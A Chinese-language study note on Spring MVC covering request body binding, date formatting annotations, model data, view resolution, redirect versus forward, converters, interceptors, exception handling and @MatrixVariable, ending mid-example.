@RequestBody注解修饰pojo类型参数\n当@RequestBody注解修饰的参数的类型为pojo时，会有一个**自动**转换过程，将请求体中数据转换为对应的pojo对象。其转换规则可如下 :\n- 请求体中的数据为json数据时： springmvc会自动通过使用HandlerAdapter配置的HttpMessageConverters来将json字符串转换为java对象，**注：这个转换过程需要导入jackson包**\n- 请求体中的数据为一个个键值对时： 此转换过程不需要导入其他包\n\n```java\n@ResponseBody\n@RequestMapping(value = \"/test1\")\n\tpublic Boolean test1(@RequestBody User user){\n\t\treturn false;\n\t}\n}\n\n@ResponseBody\n@RequestMapping(value = \"/test2\")\n\tpublic Boolean test2(@RequestBody List<User> users){\n\t\treturn false;\n\t}\n}\n```\n\n### 如何使用@RequestBody传递多个不同对象\n如果使用spring mvc同客户端通信，完全使用json数据格式，需要增加RequestBody注解，函数参数为自定义类\n```java\n@Controller\npublic class TestController{\n  @RequestMapping(\"\\test\")\n  @ResponseBody\n  public RetureResult test(@RequestBody User user){\n    return new ReturnResult();\n  }  \n}\n```\n这样的话，可以将接收到的json格式的数据转换为指定的数据对象user。比如{name:\"test\"}，name为User类的属性域。通过ResponseBody注解，可以返回json格式的数据。\n有时接收json格式数据时，我们可能需要将其转换为多个对象。\n以下方式是错误的。原因是request的content-body是以流的形式进行读取的，读取完一次后，便无法再次读取了。\n```java\n@Controller\npublic class TestController{\n  @RequestMapping(\"\\test\")\n  @ResponseBody\n  public RetureResult test(@RequestBody User user,@RequestBody Address address){\n    return new ReturnResult();\n  }  \n}\n```\n\n#### 解决方案1：\n增加一个包装类，将所需要类写入，增加get，set方法\n```java\n@Controller\npublic class TestController{\n  @RequestMapping(\"\\test\")\n  @ResponseBody\n  public RetureResult test(@RequestBody Param param){\n    User user=param.getUser();\n    Address address=param.getAddress();\n    return new ReturnResult();\n  }  \n}\nclass Param{\n \n    private User user;\n    private Address address;  \n \n    public User getUser() {\n        return user;\n    }\n \n    public void setUser(User user) {\n        this.user = user;\n    }\n \n    public Address getAddress() {\n        return address;\n    }\n \n    public void setAddress(Address address) {\n        this.address = address;\n    }\n}\n```\n此时传输的json数据格式变为`{user:{name:\"test\"},address:{location:\"新华路\"}}`。\n\n由于只是在TestController中增加一个包装类，不会影响其他的类以及已经定义好的model类，因此可以非常方便的达到接收多个对象参数的目的。\n\n#### 解决方案2：\n将接收参数定义为Map`<String, Object>`，然后使用map转object工具，转换成需要的对象。\n此时，即使自定义的Param类中的属性即使比json数据中的属性少了，也没关系。\n其中JSONUtils为自定义的工具类，可使用常见的fastjson等工具包包装实现。\n```java\n@Controller\npublic class TestController{\n  @RequestMapping(\"\\test\")\n  @ResponseBody\n  public Object test(@RequestBody Map<String, Object> models){\n　　　User user=JsonXMLUtils.map2object((Map<String, Object>)models.get(\"user\"),User.class); \n　　　Address address=JsonXMLUtils.map2object((Map<String, Object>)models.get(\"address\"),Address.class); \n　　　return models; \n　}\n}\n```\n```java\nimport com.alibaba.fastjson.JSON;\n \npublic class JsonXMLUtils {\n    public static String obj2json(Object obj) throws Exception {\n        return JSON.toJSONString(obj);\n    }\n \n    public static <T> T json2obj(String jsonStr, Class<T> clazz) throws Exception {\n        return JSON.parseObject(jsonStr, clazz);\n    }\n \n    public static <T> Map<String, Object> json2map(String jsonStr)     throws Exception {\n            return JSON.parseObject(jsonStr, Map.class);\n    }\n  \n    public static <T> T map2obj(Map<?, ?> map, Class<T> clazz) throws Exception {\n        return JSON.parseObject(JSON.toJSONString(map), clazz);\n    }\n}\n```\n# @JsonFormat和@DateTimeFormat的作用\n## @DatetimeFormat\n@DatetimeFormat是将String转换成Date，一般前台给后台传值时用\n```java\nimport org.springframework.format.annotation.DateTimeFormat;\n\n/**\n\t* 前台传后台时, 字符串自动封装成日期\n\t*/\n@DateTimeFormat(pattern = \"yyyy-MM-dd HH:mm:ss\")\nprivate Date birth;\n``` \n\n## @JsonFormat\n@JsonFormat(pattern=”yyyy-MM-dd”) 将Date转换成String 一般后台传值给前台时\n```java\nimport com.fasterxml.jackson.annotation.JsonFormat;\n\n/**\n\t* 后台返给前台时, 日期自动格式化\n\t*/\n@JsonFormat(pattern = \"yyyy-MM-dd HH:mm:ss\")\nprivate Date birth;\n``` \n\n注意\n@JsonFormat不仅可以完成后台到前台参数传递的类型转换，还可以实现前台到后台类型转换。\n当content-type为application/json时，优先使用@JsonFormat的pattern进行类型转换。而不会使用@DateTimeFormat进行类型转换。\t\n\n# 处理模型数据\nSpring MVC 提供了以下几种途径输出模型数据：\n– ModelAndView: 处理方法返回值类型为 ModelAndView时, 方法体即可通过该对象添加模型数据\n– Map 及 Model: 入参为org.springframework.ui.Model、org.springframework.ui.ModelMap 或 java.uti.Map 时，处理方法返回时，Map中的数据会自动添加到模型中。\n– @SessionAttributes: 将模型中的某个属性暂存到HttpSession中，以便多个请求之间可以共享这个属性\n– @ModelAttribute: 方法入参标注该注解后, 入参的对象就会放到数据模型中\n\n## ModelAndView\n控制器处理方法的返回值如果为 ModelAndView, 则其既包含视图信息，也包含模型数据信息。\nModelAndView中的方法\n• 添加模型数据:\n– MoelAndView addObject(String attributeName, Objectattribute Value)\n– ModelAndView addAllObject(Map<String, ?> modelMap)\n• 设置视图:\n– void setView(View view)\n– void setViewName(String viewName)j\n```java\n@RequestMapping(value=\"/param\", method=RequestMethod.POST)\npublic ModelAndView param(){\n\tModelAndView mav = new ModelAndView();\n\tmav.addObject(\"username\", \"root\");//往request作用域中放值\n\tmav.setViewName(\"success\");//设置视图名称，实现页面跳转\n\treturn mav;\n}\n```\n\n## Map 及 Model\nSpring MVC 在内部使用了一个org.springframework.ui.Model 接口存储模型数据\n具体步骤\n– Spring MVC 在调用方法前会创建一个隐含的模型对象作为模型数据的存储容器。\n– 如果方法的入参为 Map 或 Model 类型，Spring MVC 会将隐含模型的引用传递给这些入参。在方法体内，开发者可以通过这个入参对象访问到模型中的所有数据，也可以向模型中添加新的属性数据\n```java\n@RequestMapping(value=\"/param\", method=RequestMethod.POST)\npublic String param(Map<String, Object> map){\n\tmap.put(\"username\", \"admin\");//向request作用域中放值\n\treturn \"success\";\n}\n```\n```java\n@RequestMapping(value=\"/param\", method=RequestMethod.POST)\npublic String param(Model model){\n\tmodel.addAttribute(\"username\", \"zhangsan\");//向request作用域中放值\n\treturn \"success\";\n}\n```\n\n## @SessionAttributes\n若希望在多个请求之间共用某个模型属性数据，即将数据放入session域中， 则可以在控制器类上标注一个 @SessionAttributes, Spring MVC将在模型中对应的属性暂存到 HttpSession 中。\n• @SessionAttributes 除了可以通过属性名指定需要放到会话中的属性外，还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中\n– @SessionAttributes(types=User.class) 会将隐含模型中所有类型为 User.class 的属性添加到session域中。\n– @SessionAttributes(value={“user1”, “user2”}) 会将属性名为user1与user2的属性添加到session域中\n– @SessionAttributes(types={User.class, Dept.class})\n– @SessionAttributes(value={“user1”, “user2”},types={Dept.class})\n注：该注解只能放在类的上面，而不能放在方法上面\n```java\n@SessionAttributes(value={\"user\"}, types={String.class})\n@Controller\npublic class SpringMVCTest{\n\n\t@RequestMapping(value=\"/param\", method=RequestMethod.POST)\n\tpublic String param(Map<String, Object> map){\n\t\tUser user = new User(\"Tom\", \"1234\", \"tom@atguigi\", 14);\n\t\t// 由于@SessionAttributes的作用，一下操作将user,school属性添加到session域中了\n\t\tmap.put(\"user\", user);\n\t\tmap.put(\"school\", \"atguigu\");\n\t\treturn \"success\";\n\t}\n}\n```\n\n# 视图和视图解析器 \n请求处理方法执行完成后，最终返回一个 ModelAndView对象。对于那些返回 String，View 或 ModeMap 等类型的处理方法，Spring MVC 也会在内部将它们装配成一个ModelAndView 对象，它包含了逻辑名和模型对象的视图\n• Spring MVC 借助视图解析器（ViewResolver）得到最终的视图对象（View），最终的视图可以是 JSP ，也可能是Excel、JFreeChart 等各种表现形式的视图\n• 对于最终究竟采取何种视图对象对模型数据进行渲染，处理器并不关心，处理器工作重点聚焦在生产模型数据的工作上，从而实现 MVC 的充分解耦\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124522.png)\n\n## 视图\n视图的作用是渲染模型数据，将模型里的数据以某种形式呈现给客户\n为了实现视图模型和具体实现技术的解耦，Spring 在org.springframework.web.servlet 包中定义了一个高度抽象的View接口\n视图对象由视图解析器负责实例化。由于视图是无状态的，所以他们不会有线程安全的问题\n常用的视图实现类\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124532.png)\n\n## 视图解析器\nSpringMVC 为逻辑视图名的解析提供了不同的策略，可以在 Spring WEB 上下文中配置一种或多种解析策略，并指定他们之间的先后顺序。每一种映射策略对应一个具体的视图解析器实现类。\n• 视图解析器的作用比较单一：将逻辑视图解析为一个具体的视图对象。\n• 所有的视图解析器都必须实现 ViewResolver 接口：\n常用的视图解析器实现类\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124542.png)\n\n程序员可以选择一种视图解析器或混用多种视图解析器\n• 每个视图解析器都实现了 Ordered 接口并开放出一个 order 属性，可以通过 order 属性指定解析器的优先顺序，order 越小优先级越高。\n• SpringMVC 会按视图解析器顺序的优先顺序对逻辑视图名进行解析，直到解析成功并返回视图对象，否则将抛出 ServletException 异常\n\n### InternalResourceViewResolver\nJSP 是最常见的视图技术，可以使用InternalResourceViewResolver 作为视图解析器：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124552.png)\n\n若项目中使用了 JSTL，则 SpringMVC 会自动把视图由InternalResourceView 转为 JstlView\n• 若使用 JSTL 的fmt标签则需要在 SpringMVC 的配置文件中配置国际化资源文件\n```xml\n<bean id=\"messageSource\" class=\"org.springframework.context.support.ResourceBundleMessageSource\">\n\t<property name=\"basename\" value=\"i18n\"></property>\n</bean>\n```\n\n若希望直接响应通过SpringMVC渲染的页面，可以使用 mvc:viewcontroller 标签实现; 即配置直接转发的页面，而不需要经过Handler的方法\n```xml\n<mvc:view-controller path=\"springmvc/testJstlView\" view-name=\"success\"/>\n```\n\n## 重定向与转发\n一般情况下，控制器方法返回字符串类型的值会被当成逻辑视图名处理\n• 如果返回的字符串中带 forward: 或 redirect: 前缀时，SpringMVC 会对他们进行特殊处理：将 forward: 和redirect: 当成指示符，其后的字符串作为 URL 来处理\n– redirect:success.jsp：会完成一个到 success.jsp 的重定向的操作\n– forward:success.jsp：会完成一个到 success.jsp 的转发操作， 等价于不加前缀\n\n### 重定向与转发的区别\n**请求转发(forward):**\nserlvet原生语法: request对象.getRequestDispatcher(String path).forward(request,response);\n特点:\n- 浏览器地址栏路径没变,依然是AServlet的资源名称.\n- 只发送了一个请求.\n- 共享同一个请求,在请求中共享数据.\n- **只能访问当前应用中的资源,不能跨域跳转.**\n- 可以访问WEB-INF中的资源.\n\n**转发（服务器行为）过程**：客户端浏览器发送http请求-->web服务器接收此请求后调用内部的方法在容器内部完成请求处理和转发动作-->将目标资源发生给客户。转发的路径必须是同一个web容器下的url，其不能转向到其他web路径上去，中间传递的是自己容器内的request。在客户端浏览器地址栏中的地址不会发生变化，显示的仍然是其第一次访问的路径。转发行为是浏览器只做了一次访问请求。（后端代码如：request.getRequestDispatcher(\"xxx.jsp\").forward(request,response)）。\n\n**URL重定向(redirect):**\nservlet原生语法:response对象.sendRedirect(String path);\n特点:\n- 浏览器地址栏发生变化,变成BServlet的资源名称.\n- 发送两个请求.\n- 因为是不同的请求,所以不能共享请求中的数据.\n- **可以跨域访问资源.**\n- 不可以访问WEB-INF中的资源\n\n**重定向（客户端行为）过程**：　客户端浏览器发送http请求-->web服务器接收后发送302状态码响应及对应新的地址给客户浏览器-->客户端浏览器发现是302响应，则自动再发送一个新的http请求，请求新的url地址-->服务器根据新的请求去寻找资源并发送给客户。这里的地址可以重定向到任意的url，既然是浏览器重新发送请求，则不存在request传递的概念。在客户端浏览器路径显示的是重定向后的路径，客户能观察到地址的变化。重定向行为是浏览器做了至少两次访问请求。（后端代码如：response.sendRedirect(\"xxx.jsp\")）；\n\n两者形象的示例：（假使你要去办理某个证照）\n重定向：你先去了A局，A局的人说：“这个事情不归我们管，去B局”，然后你就从A局退出来，自己去了B局；\n转发：你先去了A局，A局看了以后，知道这个事情其实是B局办理的，但B局的人没有把你退回来，而是让你休息等会，自己去联系了B局的人让他们办好了给你送过来。\n\n**请求转发和重定向的选择?**\n- 若需要共享请求中的数据,只能使用请求转发.\n- 若需要访问WEB-INF中的资源,只能使用请求转发.\n- 若需要跨域访问,只能使用URL重定向.\n- 请求转发可能造成表单的重复提交问题.\n- 其他时候,任选.\n\n## 乱码问题\n在web.xml中添加过滤器CharacterEncodingFilter\n```xml\n<filter>\n\t<filter-name>CharacterEncodingFilter</filter-name>\n\t<filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\n\t<init-param>\n\t\t<param-name>encoding</param-name>\n\t\t<param-value>UTF-8</param-value>\n\t</init-param>\n</filter>\n<filter-mapping>\n\t<filter-name>CharacterEncodingFilter</filter-name>\n\t<url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n注：CharacterEncodingFilter的拦截顺序必须要放在所有拦截器的第一个，否则还是会出现乱码问题。这是因为\nrequest对象的parameter并不是一开始就解析的，它是等你第一次调用getParameter*等凡和获得请求参数有关的方法的时候才解析的\nparamter一旦被解析过一次，那就不会再次被解\t析\n所以如果在CharacterEncodingFilter之前有另外一个filter，而这个filter调用了getParameter*方法，那么就有可能使用错误的encoding来解析，从而造成乱码问题。\n\n# 加载静态资源\n优雅的 REST 风格的资源URL 不希望带 .html 或 .do 等后缀\n若将 DispatcherServlet 请求映射配置为 /，则 Spring MVC 将捕获WEB 容器的所有请求，包括静态资源的请求， SpringMVC 会将他们当成一个普通请求处理，因找不到对应处理器将导致错误。\n可以在 SpringMVC 的配置文件中配置 `<mvc:default-servlethandler/>` 的方式解决静态资源的问题：\n– `<mvc:default-servlet-handler/>` 将在 SpringMVC 上下文中定义一个DefaultServletHttpRequestHandler，它会对进入 DispatcherServlet 的请求进行筛查，如果发现是没有经过映射的请求，就将该请求交由 WEB应用服务器默认的 Servlet 处理，如果不是静态资源的请求，才由DispatcherServlet 继续处理\n– 一般 WEB 应用服务器默认的 Servlet 的名称都是 default。若所使用的WEB 服务器的默认 Servlet 名称不是 default，则需要通过 defaultservlet-name 属性显式指定\n\n注：使用`<mvc: default-servlet-handler/>`需要开启mvc驱动`<mvc: annotation-driven />`\n\n**注：WEB-INF下的静态资源是不能通过url来访问的**，原因如下\n由于WEB-INF目录下资源文件安全性都是很高的。它是不能直接通过浏览器来访问。\n只能通过服务器来访问------所以WEB-INF目录下一般存放的是lib文件夹（项目需要用到的jar包），服务器的配置文件web.xml，以及一些访问安全性较高的jsp/html页面（通常是后台管理页面）。\n如果要访问WEB-INF下的jsp/html页面，只能通过请求转发（经过控制层）来访问。\n所以即使做了静态资源放行的配置，通过浏览器访问WEB-INF下的静态资源还是会报404。\n\n# 自定义参数转换规则\n## 处理器获取参数逻辑\n当一个请求到来时，在处理器执行的过程中，它首先会从HTTP请求和上下文环境来得到参数，如果是简易的参数它会以简单的转换器进行转换，而这些简单的转换器是SpringMVC自身已经提供了的。但是如果转换HTTP请求体（Body），它就会调用`HttpMessageConverter`接口的方法对请求体的信息进行转换，首先它会判断能否对请求体进行转换，如果可以就会将其转换为Java类型。\n\nHttpMessageConverter接口源码\n```java\npackage org.springframework.http.converter;\n\npublic interface HttpMessageConverter<T> {\n    //是否可读，其中clazz为Java类型，mediaType为http请求类型\n    boolean canRead(Class<?> var1, @Nullable MediaType var2);\n    \n\t//判断clazz类型是否能够转换为mediaType媒体类型\n    boolean canWrite(Class<?> var1, @Nullable MediaType var2);\n\t\n    //可支持的媒体类型列表\n    List<MediaType> getSupportedMediaTypes();\n\n    //当canRead()验证通过后，读入http请求信息\n    T read(Class<? extends T> var1, HttpInputMessage var2) throws IOException, HttpMessageNotReadableException;\n    \n\t//当canWrite()方法验证通过后，写入响应\n    void write(T var1, @Nullable MediaType var2, HttpOutputMessage var3) throws IOException, HttpMessageNotWritableException;\n}\n```\n上面的HttpMessageConverter接口只是将HTTP请求体转换为对应的Java对象，而对于HTTP参数和其他内容，还没有讨论。例如，以性别参数来说，前端可能传递给控制器的是一个整数，而控制器参数却是一个枚举，这样就需要提供自定义的参数转换规则。\n\n在SpringMVC中，是通过WebDataBinder机制来获取参数的，它的主要作用是解析http请求的上下文，然后再控制器的调用之前转换参数并且提供验证的功能，为调用控制器的方法做准备。处理器会从HTTP请求中读取数据，然后通过三种接口来进行各类参数转换，者三种接口是Converter，Fomatter，GenericConverter。在SpringMVC的机制中这三种接口的实现类都采用了注册机的机制，默认的情况下SpringMVC已经在注册机内注册了许多的转换器，这样就可以实现大部分的数据类型的转换，所以在大部分的情况下下无需开发者再提供转换器。当下需要自定义转换规则时，只需要在注册机上注册自己的转换器就可以了。\n\n实际上，WebDataBinder机制还有一个重要的功能，那就是验证转换结果。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124601.png)\n\n可以看到控制器的参数是处理器通过Converter、Formatter和GenericConverter这三个接口转换出来的。\n\n- Converter：普通的转换器，例如有一个Integer类型的控制器参数，而从HTTP对应的为字符串，对应的Convert就会将字符串转换为Integer类型。\n- Formatter：格式化转换器，类似日期字符串就是通过它按照约定的格式转换为日期。\n- GenericConverter：将HTTP参数转换为数组。\n\n## 转换器注册\n对于数据类型转换，SpringMVC提供了一个服务机制去管理，它就是ConversionService接口。在默认情况下下，会使用这个接口的子类DefaultFormattingConversionService对象来管理这些转换器类。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124610.png)\n\n可以看出，Converter、Formatter和GenericConverter可以通过注册机接口进行注册，这样处理器就可以获取对应的转换器来实现参数的转换。\n\n上面讨论的是普通的SpringMVC的参数转换规则，而在spring boot中还提供了特殊的机制来管理这些转换器。Spring Boot的自动配置类WebMvcAutoConfiguration还定义了一个内部类WebMvcAutoConfigurationAdapter，代码如下\n\n```java\n      public void addFormatters(FormatterRegistry registry) {\n            \n            //在IoC容器中获取Converter类型的Bean，然后获得迭代器\n            Iterator var2 = this.getBeansOfType(Converter.class).iterator();\n\t\t\t//遍历迭代器，然后注册到服务类中\n            while(var2.hasNext()) {\n                Converter<?, ?> converter = (Converter)var2.next();\n                registry.addConverter(converter);\n            }\n\t\t\t\n            //在IoC容器中获取GenericConverter类型的Bean，然后获得迭代器\n            var2 = this.getBeansOfType(GenericConverter.class).iterator();\n\t\t\t//遍历迭代器，然后注册到服务类中\n            while(var2.hasNext()) {\n                GenericConverter converter = (GenericConverter)var2.next();\n                registry.addConverter(converter);\n            }\n\t\t\t\n            //在IoC容器中获取Formatter类型的Bean，然后获得迭代器\n            var2 = this.getBeansOfType(Formatter.class).iterator();\n\t\t\t//遍历迭代器，然后注册到服务类中\n            while(var2.hasNext()) {\n                Formatter<?> formatter = (Formatter)var2.next();\n                registry.addFormatter(formatter);\n            }\n\n        }\n```\n可以看到，在spring boot的初始化中，会将对应用户自定义的Convert、Formatter和GenericConverter的实现类所传就的spring bean自动地注册到DefaultFormattingConversionService对象中。这样对于开发者，只需要自定义Convert、Formatter和GenericConverter的接口Bean，spring boot就通过这个方法将它们注册到ConversionService对象中。其中，格式化Formatter接口在实际开发中使用率较低。\n\n## 一对一转换器（Converter）\nConverter是一对一转换器，也就是从一种类型转换为另外一种类型，其接口定义十分简单。如下\n\nConverter接口源码\n```java\npackage org.springframework.core.convert.converter;\n\nimport org.springframework.lang.Nullable;\n\n@FunctionalInterface\npublic interface Converter<S, T> {\n    \n    //转换方法，S代表原类型，T代表目标类型\n    @Nullable\n    T convert(S var1);\n}\n```\n这个接口类型有原类型（S）和目标类型（T）两种，它们通过convert方法进行转换。\n\n例如，http的类型为字符串（String）型，而控制器参数为Long型，那么就可以通过Spring内部提供的StringToNumber进行转换。\n\n示例：假设前端要传递一个用户信息，这个用户信息的格式是{id}-{personName}-{note}，而控制器的参数是Person对象。这里需要一个从String转换为Person的转换器。\n```java\npackage com.lay.mvc.converter;\n\nimport com.lay.mvc.entity.Person;\nimport org.springframework.core.convert.converter.Converter;\n\n@Component\npublic class StringToPersonConverter implements Converter<String, Person> {\n    //转换方法\n    @Override\n    public Person convert(String s) {\n        Person person=new Person();\n        String[] strArr=s.split(\"-\");\n        Long id=Long.parseLong(strArr[0]);\n        String personName=strArr[1];\n        String note=strArr[2];\n        person.setId(id);\n        person.setPersonName(personName);\n        person.setNote(note);\n        return person;\n    }\n}\n```\n\n这里类标注了注解@Component，并且实现了Converter接口，这样Spring就会将这个类扫描并且装配到IoC容器中。\n\n控制器验证\n```java\n   @GetMapping(\"/converter\")\n    @ResponseBody\n    public Person getPersonByConverter(Person person){\n        return person;\n    }\n```\n\n## GenericConverter集合和数组转换\nGenericConverter是数组转换器。因为SpringMVC自身提供了一些数组转换器，需要自定义的并不多，所以这里只介绍SpringMVC自定义的数组转换器。\n\n假设需要同时新增多个用户，这样便需要传递一个用户列表（List）给控制器。此时SpringMVC会使用StringToCellectionConverter转换它，这个类实现了GenericConverter接口，并且是SpringMVC内部已经注册的数据转换器。它首先会把字符串用逗号分隔称为一个个的子字符串，然后根据原类型为String，目标类型泛型为Person类，找到对应的Converter进行转换，将字符串转换为Person对象。\n```java\n    @GetMapping(\"/converterList\")\n    @ResponseBody\n    public List<Person> personList(List<Person> personList){\n        return personList;\n    }\n```\n这里参数使用了一个个逗号分隔，StringToCollectionConverter在处理时就通过逗号分隔，然后通过之前自定义的转换器StringToPerson将其变为用户对象，在组成一个列表List传递给控制器。\n\n# 拦截器\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124620.png)\n\nSpring MVC也可以使用拦截器对请求进行拦截处理，用户可以自定义拦截器来实现特定的功能，自定义的拦截器必须实现HandlerInterceptor接口\n– preHandle()：这个方法在业务处理器处理请求之前被调用，在该方法中对用户请求 request 进行处理。如果程序员决定该拦截器对请求进行拦截处理后还要调用其他的拦截器，或者是业务处理器去进行处理，则返回true；如果程序员决定不需要再调用其他的组件去处理请求，则返回false。\n– postHandle()：这个方法在业务处理器处理完请求后，但是DispatcherServlet 向客户端返回响应前被调用，在该方法中对用户请求request进行处理。\n– afterCompletion()：这个方法在 DispatcherServlet 完全处理完请求后被调用，可以在该方法中进行一些资源清理的操作。\n\n实例：\n配置拦截器\n```xml\n<mvc:interceptors>\n\t<!-- 默认拦截所有请求 -->\n\t<bean class=\"com.atguigu.interceptor.FirstInterceptor\"></bean>\n\n\t<!-- 设置自定义拦截方式 -->\n\t<mvc:interceptor>\n\t\t<bean class=\"com.atguigu.interceptor.FirstInterceptor1\"></bean>\n\t\t<mvc:mapping path=\"test\"/>\n\t\t<mvc:exclude-mapping path=\"test1\"/>\n\t</mvc:interceptor>\n</mvc:interceptors>\n```\n```java\npublic class FirstInterceptor implements HandlerInterceptor{\n\t...\n}\n```\n\n当有多个拦截器时： \npreHandle: 按照拦截器数组的正向顺序执行\npostHandle: 按照拦截器的反向顺序执行\nafterCompletion: 按照拦截器数组的反向顺序执行\n\n当多个拦截器的preHandle有不同值时\n1. 第一个返回false, 第二个返回false： 只有第一个preHandle会执行\n2. 第一个返回true， 第二个返回false： 两个拦截器的preHandle都会执行，但两个拦截器的postHandle都不会执行，而afterCompletion只有第一个执行(返回false的拦截器之前的所有afterCompletion)\n3. 第一个返回false, 第二个返回true：只有第一个的preHandle会执行\n\n# 异常处理\nSpring MVC 通过 HandlerExceptionResolver 处理程序的异常，包括 Handler 映射、数据绑定以及目标方法执行时发生的异常。\nSpringMVC 提供的 HandlerExceptionResolver 的实现类\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124634.png)\n\n\n## SimpleMappingExceptionResolver\n如果希望对所有异常进行统一处理，可以使用SimpleMappingExceptionResolver，它将异常类名映射为视图名，即发生异常时使用对应的视图报告异常\n```xml\n<bean class=\"org.springframework.web.servlet.handler.SimpleMappingExceptionResolver\">\n\t<property name=\"exceptionMappings\">\n\t\t<props>\n\t\t<!-- 其中error为视图名称， 当发生NullPointerException异常时，跳转到视图名称为error的页面 -->\n\t\t <prop key=\"java.lang.NullPointerException\">error</prop>\n\t\t</props>\n\t</property>\n</bean>\n```\n\n# spring与sringmvc整合\n如果不使用spring, 而全部使用springmvc, 虽然springmvc能实现spring所有功能， 但是这样的话，需要将spring所管理的内容都交给springmvc管理，这样会造成逻辑混乱。\n\n如果即使用spring也是用springmvc, 那spring的配置文件应该什么时候加载？怎样加载？\nspring配置文件加载一定要在springmvc配置文件加载之前，因为， springmvc配置文件扫描控制层组件@Controller时，遇到自动装配时， 可能涉及到dao等层对象， 而这些层对象在spring配置文件加载后才创建，所以如果springmvc配置文件扫描在spring之前， 由于springmvc扫描组件，自动装配时，由于dao等层对象还没创建，所以会报错。\nspringmvc配置文件是在DispatcherServlet被加载时，被加载， 所以spring配置文件的加载一定要在servlet加载之前，在servlet加载之前的有过滤器，监听器等， 我们不能在加载过滤器时加载spring配置文件，因为每收到一个请求，过滤器就会加载一次，所以如果把spring配置文件加载时机放在过滤器加载中，则会导致spring配置文件加载多次，从而导致创建多个bean对象。\n我们可以把spring配置文件加载放在监听器中， 其实spring已经为我们想好了，我们可以创建一个ContextLoaderListener监听器，这个监听器加载的时候，会自动加载spring配置文件。\n注spring配置文件的默认位置是在WEB-INF下的applicationContext.xml;  我们可以在使用`<context-param>`来修改； 具体web.xml配置如下：\n```xml\n<!-- <context-param>执行在<listener>之前 -->\n<!-- 修改spring配置文件为source目录下的spring.xml -->\n<context-param>\n\t<param-name>contextConfigLocation</param-name>\n\t<param-value>classpath:spring.xml</param-value>\n</context-param>\n\n<listener>\n\t<listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n</listener>\n\n```\n\n一定要防止bean被创建两次，即一个bean对象在spring配置文件扫描组件时创建了，又在springmvc配置文件扫描组件时创建了。 即Spring 的 IOC 容器不应该扫描 SpringMVC 中的 bean, 对应的SpringMVC 的 IOC 容器不应该扫描 Spring 中的 bean。我们可以使用`<context:exclude-filter>`标签\nspringmvc配置文件\n```xml\n<context:component-scan base-package=\"com.ssm.user\" use-default-filters=\"false\">\n\t<context:include-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n```\n以上配置指示扫描器单单扫描context:include-filter指定的类即@Controller注解指定的类，因为已经指定use-default-filters=\"false\"不使用默认的filters，默认filters为全部的注解包括了@Controller、@Service等，所以默认情况下只要没有显示指定为不使用默认的filers.context:component-scan base-package指定的扫描器都会对相应的注解进行扫描。因此可以说use-default-filters=\"false\"属性是专门和context:include-filter子标签一起使用，这样可以更加自由地指定哪些注解由扫描器扫描。其意思相当于：只扫描@xxx注解的标志的类。\n相应地在spring配置文件内，配置包扫描时则是\n```xml\n<context:component-scan base-package=\"com.ssm.user\">\n\t\t<context:exclude-filter type=\"annotation\" expression=\"org.springframework.stereotype.Controller\"/>\n</context:component-scan>\n```\n指定不扫描哪些注解标识的类，此时不用再使用use-default-filters指定，以为该属性默认为true，即该扫描器相关的注解@Controller、@Service等标识的类都会被扫描到，所以不用显示指定，只需使用子标签context:exclude-filter指定不扫描哪些注解标识的类即可。\n总的来说就是属性use-default-filters=\"false\"和context:include-filter子标签一起使用，其意为：只扫描指定注解的类。子标签context:exclude-filter直接使用，其意为不扫描指定注解标识的类，其他相关注解标识类全部扫描。\n\n## spring和springmvc容器的关系\nspring和springmvc容器的关系: spring是父容器， springmvc是子容器。 \n规定： 子容器能够调用访问父容器中的bean, 而父容器不能够调用子容器中的bean\n\n# @MatrixVariable\nRFC3986定义URI的路径(Path)中可包含name-value片段，扩充了以往仅能通过查询字符串(Query String)设置可选参数的囧境。\n假如现在需要设计一个用于“搜索某部门某些员工可选信息中的部分信息”的API，我们分别使用查询字符串和路径name-value方式来设计对比，看看具体效果：\n\n查询字符串方式：`/api/v1/users/optional-info?dept=321&name=joh*&fields=hometown,birth`\n问题：其中的dept和name理应属于users路径，而fields则属于optional-info路径，但现在全部都要挤在查询字符串中。\n路径name-value方式：`/api/v1/users/depts=321;name=joh*/optional-fields/fields=hometown,birth`\n可以看出路径name-value的方式逻辑上更在理些。\n\n**@MatrixVariable注解属性说明**\n在正式开始前我们先死记硬背一下注解的属性吧。\n- `pathVar`： 用于指定name-value参数所在的路径片段名称\n- `name`： 用于指定name-value参数的参数名\n- `required`： 是否为必填值，默认为false\n- `defaultValue`\t： 设置默认值\n\n**启用@MatrixVariable**\n虽然从Spring 3.2就已经支持@MatrixVariable特性，但直至现在其依然为默认禁用的状态。我们需要手工配置开启才能使用。\n```java\n@Configuration                                              \npublic class SpringBootConfig implements WebMvcConfigurer { \n   @Override\n   public void configurePathMatch(PathMatchConfigurer configurer) {\n      UrlPathHelper urlPathHelper = new UrlPathHelper();\n      urlPathHelper.setRemoveSemicolonContent(false); \n      configurer.setUrlPathHelper(urlPathHelper); \n\t }\n} \n```\n\n**参数仅有一个值的玩法**\n注意：多个name-value间以分号分隔，如name=joh*;dept=321。\n```java\n/* \n 1. 获取单个路径片段中的参数\n 请求URI为 /Demo2/66;color=red;year=2020\n*/  \n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET)\npublic String test1(@PathVariable String id, @MatrixVariable String color, @MatrixVariable String year){}\n\n/*              \n 2. 获取单个路径片段中的参数\n 请求URI为 /Demo2/color=red;year=2020\n*/\n@RequestMapping(path=\"/Demo1/{id}\", method=RequestMethod.GET) \npublic String test2(@MatrixVariable String color, @MatrixVariable String year){} \n/* \n 3. 获取不同路径片段中的参数 \n 请求URI为 /Demo2/66;color=red;year=2020/pets/77;color=blue;year=2019 \n*/  \n@RequestMapping(path=\"/Demo2/{id1}/pets/{id2}\", method=RequestMethod.GET)\npublic String test3(@PathVariable String id1, @PathVariable String id2,\n  